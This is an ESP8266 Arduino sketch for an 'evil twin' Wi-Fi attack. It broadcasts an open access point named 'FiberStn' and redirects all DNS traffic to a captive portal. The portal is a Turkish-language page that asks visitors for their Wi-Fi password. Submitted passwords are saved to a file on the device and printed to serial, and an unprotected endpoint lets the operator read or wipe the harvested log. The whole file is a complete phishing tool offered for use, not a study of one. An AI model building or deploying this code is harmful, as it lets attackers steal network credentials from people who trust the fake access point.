#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>  

const char *ssid = "FiberStn"; 

DNSServer dnsServer;
ESP8266WebServer server(80);

void handleRoot() {
  String html = "<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Ağda oturum açın</title></head><body><h1>Oturum aç</h1><p>Wifi ağında oturum açmak için şifrenizi girmeniz gereklidir:</p><form action='/submit' method='POST'><input type='password' name='password'><input type='submit' value='Giriş Yap'></form></body></html>";
  server.send(200, "text/html; charset=utf-8", html);
}

void handleFormSubmit() {
  if (server.hasArg("password")) {
    String password = server.arg("password");

    File file = SPIFFS.open("/kayit.txt", "a");
    if (!file) {
      Serial.println("Dosya açılamadı!");
      server.send(500, "text/plain; charset=utf-8", "Dosya işlemi hatası!");
      return;
    }
    file.println(password);
    file.close();
    
    Serial.println("Girilen şifre: " + password);  
    server.send(200, "text/html; charset=utf-8", "<html><body><p>Bilgiler doğrulanıyor...</p></body></html>");
  } else {
    server.send(400, "text/html; charset=utf-8", "Şifre alınamadı!");
  }
}

void handleFileRead() {
  File file = SPIFFS.open("/kayit.txt", "r");
  if (!file) {
    server.send(404, "text/plain; charset=utf-8", "Dosya bulunamadı!");
    return;
  }

  String fileContent;
  while (file.available()) {
    fileContent += (char)file.read();
  }
  file.close();

  server.send(200, "text/plain; charset=utf-8", fileContent);
}

void handleFileReset() {
  File file = SPIFFS.open("/kayit.txt", "w");
  if (!file) {
    server.send(500, "text/plain; charset=utf-8", "Dosya sıfırlanamadı!");
    return;
  }
  file.close();  
  server.send(200, "text/plain; charset=utf-8", "Dosya sıfırlandı!");
}

void setup() {
  Serial.begin(115200);

  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS başlatılamadı!");
    return;
  }

  WiFi.softAP(ssid);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/submit", HTTP_POST, handleFormSubmit);
  server.on("/kayit.txt", HTTP_GET, handleFileRead);  
  server.on("/reset", HTTP_GET, handleFileReset);    
  server.onNotFound(handleRoot);
  server.begin();

  Serial.println("Wi-Fi Ağı Başlatıldı. Sexettin Twin devrede.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
